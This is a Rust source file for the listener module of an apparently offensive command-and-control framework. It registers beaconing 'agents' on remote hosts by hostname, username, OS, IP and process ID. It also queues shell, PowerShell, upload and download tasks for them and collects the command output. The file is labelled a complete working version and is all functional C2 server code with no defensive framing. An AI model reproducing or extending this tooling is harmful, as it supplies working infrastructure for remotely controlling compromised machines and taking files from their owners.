// src/listener/mod.rs - Complete working version with command result broadcasting
use std::io;
use std::sync::{Arc, Mutex};
use std::thread;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{channel, Sender};
use std::collections::HashMap;
use serde::{Serialize, Deserialize};
use tokio::runtime::Runtime;
use std::time::{SystemTime, UNIX_EPOCH};
use lazy_static::lazy_static;

use crate::models::agent::Agent;

// Define messages for communication
enum ListenerMessage {
    Stop,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum ListenerType {
    Http,
    Https,
    Tcp,
    Smb,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListenerConfig {
    pub listener_type: ListenerType,
    pub host: String,
    pub port: u16,
}

// Enhanced agent beacon data structure
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BeaconData {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub ip: String,
    pub pid: u32,
    pub current_directory: Option<String>, // Track current directory
}

// Enhanced task for agents with more metadata
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentTask {
    pub id: String,
    pub command: String,
    pub task_type: TaskType,
    pub created_at: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum TaskType {
    Shell,
    PowerShell,
    Upload,
    Download,
    Kill,
    Sleep,
    Cd,
}

// Enhanced task result with more information
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskResult {
    pub id: String,
    pub command: String,
    pub result: String,
    pub success: bool,
    pub execution_time_ms: u64,
    pub current_directory: Option<String>, // Return updated directory
    pub error_details: Option<String>,
}

// Global agent storage with enhanced tracking
lazy_static! {
    static ref GLOBAL_AGENTS: Arc<Mutex<HashMap<String, Agent>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref PENDING_TASKS: Arc<Mutex<HashMap<String, Vec<AgentTask>>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref TASK_RESULTS: Arc<Mutex<HashMap<String, Vec<TaskResult>>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref AGENT_DIRECTORIES: Arc<Mutex<HashMap<String, String>>> = Arc::new(Mutex::new(HashMap::new()));
    
    // 🎯 CRITICAL FIX - Simple callback system for command results
    static ref RESULT_CALLBACK: Arc<Mutex<Option<Box<dyn Fn(String, String, String, String, bool) + Send + Sync>>>> = 
        Arc::new(Mutex::new(None));
}

#[derive(Clone)]
pub struct Listener {
    pub config: ListenerConfig,
    running: Arc<AtomicBool>,
    tx: Arc<Mutex<Option<Sender<ListenerMessage>>>>,
}

impl Listener {
    pub fn new(config: ListenerConfig) -> Self {
        Listener {
            config,
            running: Arc::new(AtomicBool::new(false)),
            tx: Arc::new(Mutex::new(None)),
        }
    }
    
    pub fn start(&self) -> io::Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Ok(());
        }
        
        let (tx, rx) = channel::<ListenerMessage>();
        
        {
            let mut tx_guard = self.tx.lock().unwrap();
            *tx_guard = Some(tx);
        }
        
        self.running.store(true, Ordering::SeqCst);
        
        let config = self.config.clone();
        let running = self.running.clone();
        
        thread::spawn(move || {
            println!("🚀 Starting {:?} listener on {}:{}", config.listener_type, config.host, config.port);
            
            match config.listener_type {
                ListenerType::Http | ListenerType::Https => {
                    let rt = Runtime::new().unwrap();
                    rt.block_on(async {
                        if let Err(e) = start_http_server(&config, &running, &rx).await {
                            eprintln!("❌ HTTP server error: {}", e);
                        }
                    });
                },
                ListenerType::Tcp => {
                    start_tcp_server(&config, &running, &rx);
                },
                ListenerType::Smb => {
                    start_smb_server(&config, &running, &rx);
                }
            }
            
            println!("⏹ {:?} listener stopped on {}:{}", config.listener_type, config.host, config.port);
        });
        
        Ok(())
    }
    
    pub fn stop(&self) -> io::Result<()> {
        if !self.running.load(Ordering::SeqCst) {
            return Ok(());
        }
        
        self.running.store(false, Ordering::SeqCst);
        
        let tx_guard = self.tx.lock().unwrap();
        if let Some(tx) = tx_guard.as_ref() {
            let _ = tx.send(ListenerMessage::Stop);
        }
        
        Ok(())
    }
    
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

impl Drop for Listener {
    fn drop(&mut self) {
        let _ = self.stop();
    }
}

// 🎯 CRITICAL FUNCTIONS - Callback system for command results
pub fn set_result_callback<F>(callback: F) 
where 
    F: Fn(String, String, String, String, bool) + Send + Sync + 'static 
{
    let mut cb = RESULT_CALLBACK.lock().unwrap();
    *cb = Some(Box::new(callback));
    println!("📡 LISTENER: Result callback registered");
}

pub fn notify_command_result(agent_id: String, task_id: String, command: String, output: String, success: bool) {
    let cb = RESULT_CALLBACK.lock().unwrap();
    if let Some(ref callback) = *cb {
        println!("📡 LISTENER: Executing callback for task {}", task_id);
        callback(agent_id, task_id, command, output, success);
    } else {
        println!("⚠️ LISTENER: No callback registered for result notification");
    }
}

// Enhanced public functions to manage agents and tasks
pub fn get_all_agents() -> Vec<Agent> {
    GLOBAL_AGENTS.lock().unwrap().values().cloned().collect()
}

pub fn add_task_for_agent(agent_id: &str, command: String) -> String {
    let task_id = format!("task-{}-{}", agent_id, 
        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs());
    
    // Determine task type based on command
    let task_type = if command.trim().starts_with("cd ") {
        TaskType::Cd
    } else if command.trim().starts_with("powershell") || command.trim().starts_with("ps ") || command.trim().starts_with("Get-") {
        TaskType::PowerShell
    } else if command.trim() == "exit" || command.trim() == "kill" {
        TaskType::Kill
    } else if command.trim().starts_with("sleep ") {
        TaskType::Sleep
    } else {
        TaskType::Shell
    };
    
    let task = AgentTask {
        id: task_id.clone(),
        command,
        task_type,
        created_at: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
    };
    
    let mut pending = PENDING_TASKS.lock().unwrap();
    pending.entry(agent_id.to_string()).or_insert_with(Vec::new).push(task);
    
    println!("📋 LISTENER: Added task {} for agent {}", task_id, agent_id);
    task_id
}

pub fn get_task_results(agent_id: &str) -> Vec<TaskResult> {
    TASK_RESULTS.lock().unwrap()
        .get(agent_id)
        .cloned()
        .unwrap_or_default()
}

pub fn get_agent_directory(agent_id: &str) -> String {
    AGENT_DIRECTORIES.lock().unwrap()
        .get(agent_id)
        .cloned()
        .unwrap_or_else(|| "C:\\".to_string())
}

async fn start_http_server(
    config: &ListenerConfig, 
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use std::net::SocketAddr;
    
    let addr: SocketAddr = format!("{}:{}", config.host, config.port)
        .parse()
        .map_err(|e| format!("Invalid address: {}", e))?;
    
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    println!("🌐 HTTP listener bound to {}", addr);
    
    loop {
        if !running.load(Ordering::SeqCst) {
            break;
        }
        
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        
        tokio::select! {
            result = listener.accept() => {
                match result {
                    Ok((stream, addr)) => {
                        println!("🔗 Connection from: {}", addr);
                        tokio::spawn(async move {
                            if let Err(e) = handle_http_connection(stream, addr).await {
                                eprintln!("❌ Error handling connection: {}", e);
                            }
                        });
                    }
                    Err(e) => {
                        eprintln!("❌ Failed to accept connection: {}", e);
                    }
                }
            }
            _ = tokio::time::sleep(tokio::time::Duration::from_millis(100)) => {
                // Timeout to check running flag
            }
        }
    }
    
    Ok(())
}

async fn handle_http_connection(
    mut stream: tokio::net::TcpStream,
    addr: std::net::SocketAddr
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    
    let mut buffer = [0; 8192]; // Increased buffer size
    
    match stream.read(&mut buffer).await {
        Ok(0) => return Ok(()), // Connection closed
        Ok(n) => {
            let request = String::from_utf8_lossy(&buffer[..n]);
            let first_line = request.lines().next().unwrap_or("");
            println!("📥 HTTP request from {}: {}", addr, first_line);
            
            if request.contains("POST /beacon") {
                handle_beacon_request(&mut stream, &request).await?;
            } else if request.contains("POST /task_result") {
                handle_task_result(&mut stream, &request).await?;
            } else {
                // Send 404 for unknown endpoints
                let response = "HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nNot Found";
                stream.write_all(response.as_bytes()).await?;
            }
        }
        Err(e) => {
            eprintln!("❌ Error reading from connection: {}", e);
        }
    }
    
    Ok(())
}

async fn handle_beacon_request(
    stream: &mut tokio::net::TcpStream,
    request: &str
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::AsyncWriteExt;
    
    // Extract JSON from the request body
    if let Some(body_start) = request.find("\r\n\r\n") {
        let body = &request[body_start + 4..];
        
        match serde_json::from_str::<BeaconData>(body) {
            Ok(beacon) => {
                println!("🔴 Agent beacon: {} ({}@{})", beacon.id, beacon.username, beacon.hostname);
                
                // Update current directory if provided
                if let Some(ref current_dir) = beacon.current_directory {
                    let mut dirs = AGENT_DIRECTORIES.lock().unwrap();
                    dirs.insert(beacon.id.clone(), current_dir.clone());
                }
                
                // Update or create agent
                {
                    let mut agents = GLOBAL_AGENTS.lock().unwrap();
                    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
                    
                    if let Some(agent) = agents.get_mut(&beacon.id) {
                        // Update existing agent
                        agent.last_seen = now;
                    } else {
                        // Create new agent
                        let agent = Agent::new(
                            beacon.id.clone(),
                            beacon.hostname.clone(),
                            beacon.username.clone(),
                            beacon.os.clone(),
                            beacon.arch.clone(),
                            beacon.ip.clone()
                        );
                        agents.insert(beacon.id.clone(), agent);
                        println!("✅ New agent registered: {}", beacon.id);
                    }
                }
                
                // Get pending tasks for this agent
                let tasks = {
                    let mut pending = PENDING_TASKS.lock().unwrap();
                    pending.remove(&beacon.id).unwrap_or_default()
                };
                
                // Send tasks as JSON response
                let tasks_json = serde_json::to_string(&tasks)?;
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
                    tasks_json.len(),
                    tasks_json
                );
                stream.write_all(response.as_bytes()).await?;
                
                if !tasks.is_empty() {
                    println!("📤 Sent {} tasks to agent {}", tasks.len(), beacon.id);
                }
            }
            Err(e) => {
                eprintln!("❌ Failed to parse beacon JSON: {}", e);
                let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                stream.write_all(response.as_bytes()).await?;
            }
        }
    } else {
        let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
        stream.write_all(response.as_bytes()).await?;
    }
    
    Ok(())
}

// 🎯 CRITICAL FUNCTION - Enhanced task result handler with callback notification
async fn handle_task_result(
    stream: &mut tokio::net::TcpStream,
    request: &str
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::AsyncWriteExt;
    
    // Extract JSON from the request body
    if let Some(body_start) = request.find("\r\n\r\n") {
        let body = &request[body_start + 4..];
        
        match serde_json::from_str::<TaskResult>(body) {
            Ok(result) => {
                println!("📨 LISTENER: Received task result!");
                println!("   Task ID: {}", result.id);
                println!("   Command: {}", result.command);
                println!("   Success: {}", result.success);
                println!("   Output length: {}", result.result.len());
                println!("   Output preview: {}", 
                    if result.result.len() > 200 { 
                        format!("{}...", &result.result[..200]) 
                    } else { 
                        result.result.clone() 
                    });
                
                // Update agent directory if this was a cd command
                if let Some(ref current_dir) = result.current_directory {
                    if let Some(agent_id) = extract_agent_id_from_task(&result.id) {
                        let mut dirs = AGENT_DIRECTORIES.lock().unwrap();
                        dirs.insert(agent_id, current_dir.clone());
                    }
                }
                
                // Store the result for GUI access
                if let Some(agent_id) = extract_agent_id_from_task(&result.id) {
                    println!("🔍 LISTENER: Extracted agent_id: {}", agent_id);
                    
                    {
                        let mut results = TASK_RESULTS.lock().unwrap();
                        results.entry(agent_id.clone()).or_insert_with(Vec::new).push(result.clone());
                        
                        // Keep only last 100 results per agent
                        if let Some(agent_results) = results.get_mut(&agent_id) {
                            if agent_results.len() > 100 {
                                agent_results.drain(0..agent_results.len() - 100);
                            }
                        }
                    }
                    
                    // 🎯 THE CRITICAL FIX - Notify callback to send result to client
                    println!("📡 LISTENER: Notifying callback for result broadcast...");
                    notify_command_result(
                        agent_id,
                        result.id.clone(),
                        result.command.clone(),
                        result.result.clone(),
                        result.success
                    );
                    
                    println!("✅ LISTENER: Task result processed and callback notified");
                } else {
                    println!("❌ LISTENER: Could not extract agent_id from task_id: {}", result.id);
                }
                
                let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK";
                stream.write_all(response.as_bytes()).await?;
            }
            Err(e) => {
                eprintln!("❌ LISTENER: Failed to parse task result JSON: {}", e);
                let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                stream.write_all(response.as_bytes()).await?;
            }
        }
    } else {
        let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
        stream.write_all(response.as_bytes()).await?;
    }
    
    Ok(())
}

fn extract_agent_id_from_task(task_id: &str) -> Option<String> {
    // Task ID format: task-{agent_id}-{timestamp}
    println!("🔍 LISTENER: Extracting agent_id from task_id: '{}'", task_id);
    
    let parts: Vec<&str> = task_id.split('-').collect();
    println!("🔍 LISTENER: Split parts: {:?}", parts);
    
    if parts.len() >= 3 && parts[0] == "task" {
        // Join all parts except first (task) and last (timestamp)
        let agent_id = parts[1..parts.len()-1].join("-");
        println!("🔍 LISTENER: Extracted agent_id: '{}'", agent_id);
        Some(agent_id)
    } else {
        println!("❌ LISTENER: Invalid task_id format");
        None
    }
}

fn start_tcp_server(
    _config: &ListenerConfig,
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) {
    while running.load(Ordering::SeqCst) {
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
}

fn start_smb_server(
    _config: &ListenerConfig,
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) {
    while running.load(Ordering::SeqCst) {
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
}